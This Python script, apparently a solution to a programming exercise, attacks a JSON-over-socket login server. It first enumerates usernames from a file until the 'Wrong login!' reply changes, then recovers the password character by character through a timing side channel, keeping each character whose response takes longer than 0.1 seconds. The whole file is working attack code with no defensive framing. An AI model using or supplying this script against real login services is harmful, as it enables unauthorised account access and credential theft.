import json
import sys
import socket
import time

letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
args = sys.argv
host = sys.argv[1]
port = int(sys.argv[2])
wrong_login = {"result": "Wrong login!"}
c_match = {"result": 'Wrong password!'}
success = {"result": 'Connection success!'}
pasv = ''
response = wrong_login

with socket.socket() as client_socket:
    address = (host, port)
    client_socket.connect(address)
    with open('logins.txt', 'r') as file:
        gen = (line.strip() for line in file.readlines())
        while response == wrong_login:
            login = ''.join(next(gen))
            mes = json.dumps({"login": login, "password": ' '})
            data = mes.encode()
            client_socket.send(data)
            response = json.loads(client_socket.recv(1024).decode())
    while response != success:
        for i in letters:
            mes = json.dumps({"login": login, "password": pasv + i})
            data = mes.encode()
            client_socket.send(data)
            start = time.perf_counter()
            response = json.loads(client_socket.recv(1024).decode())
            end = time.perf_counter()
            if end - start > 0.1:
                pasv += i
            elif response == success:
                break

    print(mes)




